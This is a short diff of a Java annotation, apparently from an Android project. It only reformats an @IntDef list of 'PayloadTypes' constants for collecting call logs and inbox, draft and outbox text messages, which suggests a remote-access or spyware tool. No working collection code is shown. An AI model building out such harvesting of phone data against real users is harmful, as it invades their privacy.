@@ -6,7 +6,8 @@ import java.lang.annotation.Retention;
 import java.lang.annotation.RetentionPolicy;
 
 @Retention(RetentionPolicy.RUNTIME)
-@IntDef({PayloadTypes.GET_CALL_LOGS,
+@IntDef({
+        PayloadTypes.GET_CALL_LOGS,
         PayloadTypes.GET_TEXT_MESSAGES_INBOX,
         PayloadTypes.GET_TEXT_MESSAGES_DRAFT,
         PayloadTypes.GET_TEXT_MESSAGES_OUTBOX,
